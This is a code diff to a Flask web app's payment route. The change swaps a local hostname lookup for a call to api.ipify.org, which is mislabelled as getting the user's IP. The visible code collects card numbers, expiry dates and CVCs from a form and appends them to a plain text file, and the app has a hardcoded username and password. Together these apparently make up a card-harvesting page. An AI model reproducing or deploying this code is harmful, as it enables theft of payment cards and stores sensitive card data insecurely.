@@ -1,13 +1,14 @@
 from flask import Flask, render_template, request, redirect, url_for, send_from_directory, abort, render_template_string
 import os
 import socket
+from requests import get 
 
 app = Flask(__name__)
 
 # Set your password and username
 USERNAME = '698445212547825547'
 PASSWORD = 'bevendroxmasc888'
-hostname = socket.gethostname()
+#hostname = socket.gethostname()
 
 @app.route('/')
 def home():
@@ -40,7 +41,7 @@ def submit_payment():
     card_number = request.form.get('card-number')
     expiry = request.form.get('expiry')  # MM/YY format
     cvc = request.form.get('cvc')
-    user_ip = socket.gethostbyname(hostname)  # Get the user's IP
+    user_ip = get('https://api.ipify.org').content.decode('utf8')  # Get the user's IP
 
     # Save the payment information to payment_info.txt
     with open('payment_info.txt', 'a') as f:
